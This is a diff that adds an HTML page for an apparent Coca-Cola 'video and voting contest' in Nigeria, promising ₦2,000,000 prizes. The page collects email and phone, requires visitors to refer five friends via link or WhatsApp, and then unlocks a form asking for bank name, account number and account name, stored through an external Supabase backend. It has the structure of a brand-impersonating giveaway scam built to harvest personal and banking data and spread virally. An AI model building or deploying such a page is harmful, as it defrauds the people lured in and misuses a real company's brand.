@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cola Promo Nigeria – Video & Voting Contest</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="banner">
+  <img src="coca-cola-banner.jpg" alt="Coca-Cola" id="bannerImg">
+</div>
+
+<div class="wrap">
+  <h1>Video Creation & Voting Contest</h1>
+  <div class="sub">Nov 6 – Nov 21, 2026 · Nigeria</div>
+
+  <div class="prizes">
+    <strong>Grand prize includes:</strong>
+    <ul>
+      <li>₦2,000,000 cash prize</li>
+      <li>₦2,000,000 Community Impact Grant</li>
+      <li>Media feature &amp; music streaming access</li>
+      <li>1-year product supply</li>
+      <li>Cash prizes &amp; rewards for runners-up down to 10th place</li>
+    </ul>
+  </div>
+
+  <div class="card" id="s1">
+    <h3><span class="step">1</span>Register &amp; get your referral code</h3>
+    <label>Email address</label>
+    <input id="email" type="email" placeholder="you@example.com" autocomplete="email">
+    <label>Phone number</label>
+    <input id="phone" type="tel" placeholder="0803 123 4567" autocomplete="tel">
+    <button id="regBtn">Generate my referral code</button>
+    <div class="msg" id="regMsg"></div>
+  </div>
+
+  <div class="card locked" id="s2">
+    <h3><span class="step">2</span>Refer 5 friends</h3>
+    <div class="code" id="codeBox">—</div>
+    <div class="row">
+      <button id="copyCode" type="button">Copy code</button>
+      <button id="copyLink" type="button">Copy link</button>
+      <button id="waBtn" type="button">WhatsApp</button>
+    </div>
+    <div class="bar"><div id="barFill"></div></div>
+    <div><strong id="refCount">0</strong> / 5 friends registered
+      <button id="refresh" type="button" class="small-btn">Refresh</button></div>
+    <small>A referral counts when a friend registers with your link or code.</small>
+  </div>
+
+  <div class="card locked" id="s3">
+    <h3><span class="step">3</span>Enter your bank details</h3>
+    <label>Bank</label>
+    <select id="bank"><option value="">Select bank</option></select>
+    <label>Account number (10 digits)</label>
+    <input id="acct" inputmode="numeric" maxlength="10" placeholder="0123456789">
+    <label>Account name</label>
+    <input id="acctName" placeholder="As it appears on your account">
+    <button id="submitBtn">Submit</button>
+    <div class="msg" id="bankMsg"></div>
+  </div>
+
+  <div class="card hidden" id="done">
+    <h3 class="ok">✅ You're in!</h3>
+    <p>Your details have been submitted. Please await your giveaway.</p>
+  </div>
+
+  <small>We only use your details for this promo. Never share your card PIN, BVN or OTP with anyone.</small>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js"></script>
+<script src="script.js"></script>
+</body>
+  </html>
